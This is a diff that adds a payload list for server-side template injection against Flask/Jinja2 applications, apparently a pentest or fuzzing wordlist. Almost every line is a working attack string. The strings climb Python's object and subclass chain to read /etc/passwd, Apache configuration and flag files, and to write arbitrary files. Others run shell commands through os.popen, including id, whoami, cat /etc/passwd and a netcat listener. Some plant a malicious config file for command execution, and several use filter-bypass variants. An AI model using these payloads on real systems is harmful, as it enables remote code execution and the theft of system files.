@@ -1,0 +1,70 @@
+Info
+{{global_name.__class__.__base__}}
+{{global_name.__class__.__mro__ }}
+{{g.__class__.__mro__}}
+{{g.__class__.mro()}}
+{{g.__class__.__mro__[1]}}
+{{g.__class__.__base__}}
+{{g.__class__.__mro__[1].__subclasses__()[428]('/etc/passwd').read()}}
+{{g.__class__.__mro__[1].__subclasses__()[428]('/etc/apache2/apache2.conf').read()}}
+{{g.__class__.__mro__[1].__subclasses__()[428]('/etc/ssl/certs/EC-ACC.pem').read()}}
+{{g.__class__.__mro__[1].__subclasses__()[428]('/home/elvin/Documents/flask/hello.txt').read()}}
+"{{ g.__class__.__mro__[1].__subclasses__()[428]('hello.txt', 'w').write('Hello here !') }}"
+"{{ g.__class__.__mro__[1].__subclasses__()[428]('test.txt', 'w').write('Hello here !') }}"
+"{{ g.__class__.__mro__[1].__subclasses__()[428]('go.txt', 'w').write('Hello here !') }}"
+{{g.__class__.__base__.__subclasses__()}}
+{{g.__class__.__base__.__subclasses__()[428]}}
+{{g.__class__.__base__.__subclasses__()[428]('/etc/passwd').read()}}
+{{g['__class__']['__base__']}}
+{{g['__class__']['__mro__']}}
+{{g['__class__']['__mro__'][1]['__subclasses__']()}}
+{{g['__class__']['__mro__'][1]['__subclasses__']()[428]('/etc/passwd').read()}}
+"{{g['__class__']['__mro__'][1]['__subclasses__']()[428]('antthing.txt', 'w').write('Hello here !')}}"
+"().__class__.__bases__[0].__subclasses__()[40]('r','ZmxhZy50eHQ='.decode('base64')).read()"
+"().__class__.__bases__[0].__subclasses__()[40]('r','flag.txt')).read()"
+"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}"
+"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='_Unframer' %}{{ c.__init__.__globals__['__builtins__'].exec(""[evil]"") }}{% endif %}{% endfor %}"
+{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')}}
+{{''[request.args.a][request.values.b][2][request.values.c]()[40]('/opt/flag_1234qwerty.txt').read()}}?a=__class__&b=__mro__&c=__subclasses__
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
+{{request.application.__globals__.__builtins__}}
+{{request.application.__globals__}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
+{{request.application.__globals__.__builtins__.__import__('os')}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id')}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('whatis nano nano').read()}}
+{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('nc -lvp 1337')['read']() }}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd')['read']()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whatis nano nano')['read']()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whereis flask')['read']()}}
+"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}"
+{{().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('__global'+'s__')['os'].__dict__['system']('ls')}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']}}
+{{[].__class__.__base__.__subclasses__()[60].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__.values()[12]}}
+"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='ImmutableDictMixin' %}{{ c.__hash__.__globals__['__builtins__'].eval('__import__(""os"").popen(""id"").read()') }}{% endif %}{% endfor %}"
+{{4*4}}
+{{7*'7'}}
+{{config.items()}}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{get_flashed_messages.__class__.__base__}}
+{{get_flashed_messages.__class__.__mro__}}
+{{get_flashed_messages.__class__.__base__}}
+{{get_flashed_messages}}
+{{get_flashed_messages.__class__.__mro__[1].__subclasses__()}}
+{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[428]}}
+{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[428]('/etc/passwd')}}
+{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[428]('/etc/passwd').read()}}
+"{{ get_flashed_messages.__class__.__base__.__subclasses__()[428]('hello.txt', 'w').write('Hello here !') }}"
+{{[].__class__.__base__.__subclasses__()[60]}}
+{{[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)}}
+"{{request|attr(""__class__"")}}"
+{{get_flashed_messages['__globals__']['__builtins__']['open']('/etc/passwd')}} 
+{{get_flashed_messages['__globals__']['__builtins__']['open']('/etc/passwd')['read']()}}
+{{get_flashed_messages['__globals__']['__builtins__']}}
+"{{request|attr([""_""*2,""class"",""_""*2]|join)}}"
+"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"
+"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt> <dd>{{ value|e }}</dd>{% endfor %}"
